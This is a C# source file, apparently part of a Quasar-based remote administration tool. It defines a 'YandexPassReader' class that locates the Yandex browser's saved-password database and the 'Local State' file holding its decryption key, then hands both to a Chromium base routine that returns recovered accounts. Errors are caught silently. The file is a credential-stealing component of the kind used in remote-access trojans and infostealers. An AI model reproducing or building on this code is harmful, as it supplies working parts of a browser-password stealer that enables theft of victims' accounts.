using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Everything.Recovery.Browsers
{
    public class YandexPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Yandex";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data");
                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
